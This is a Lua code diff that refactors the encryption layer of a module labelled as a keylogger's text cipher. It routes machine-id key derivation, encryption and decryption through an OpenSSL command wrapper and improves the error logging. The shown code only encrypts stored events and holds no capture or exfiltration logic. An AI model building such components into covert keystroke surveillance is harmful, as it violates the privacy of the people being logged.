@@ -27,9 +27,9 @@
 local M = {}
 
 local Logger  = require("logger.shim")
-local Shell   = require("adapters.shell_runner")
 local Crypto  = require("adapters.crypto")
 local Base64  = require("compat.base64")
+local OpenSSL = require("infra.openssl_command")
 local TextCrypto = require("keylogger.text_crypto")
 
 local LOG = "modules.keylogger.text_cipher"
@@ -133,10 +133,11 @@ local function ensure_key()
 	end
 
 	Logger.start(LOG, "Deriving the at-rest key from the machine id…")
-	local key = TextCrypto.parse_derived_key(Shell.exec(cmd))
+	local derived, native_error = OpenSSL.exec(cmd)
+	local key = TextCrypto.parse_derived_key(derived)
 	if not key then
 		_derivation_failed = true
-		Logger.error(LOG, "Key derivation produced no usable key — is openssl installed?")
+		Logger.error(LOG, "Key derivation failed or returned no usable key — %s.", native_error or "invalid key output")
 		return nil
 	end
 
@@ -217,9 +218,10 @@ function M.encrypt(device_id, event_id, plaintext)
 		input = Base64.encode(plaintext)
 		cmd = "openssl base64 -d -A | " .. cmd
 	end
-	local ciphertext = Shell.exec_exact_stdin(cmd, input)
+	local ciphertext, native_error = OpenSSL.exec(cmd, input)
 	if type(ciphertext) ~= "string" or ciphertext == "" then
-		Logger.error(LOG, "Encryption produced no output — refusing to store plaintext.")
+		Logger.error(LOG, "Encryption did not complete successfully — %s; refusing to store plaintext.",
+			native_error or "empty ciphertext")
 		return nil
 	end
 
@@ -245,8 +247,11 @@ function M.decrypt(value)
 		return ""
 	end
 
-	local plaintext = Shell.exec_exact_stdin(cmd, ciphertext)
-	if type(plaintext) ~= "string" then return "" end
+	local plaintext, native_error = OpenSSL.exec(cmd, ciphertext)
+	if type(plaintext) ~= "string" then
+		Logger.error(LOG, "Decryption did not complete successfully — %s.", native_error or "invalid plaintext output")
+		return ""
+	end
 	return plaintext
 end
 
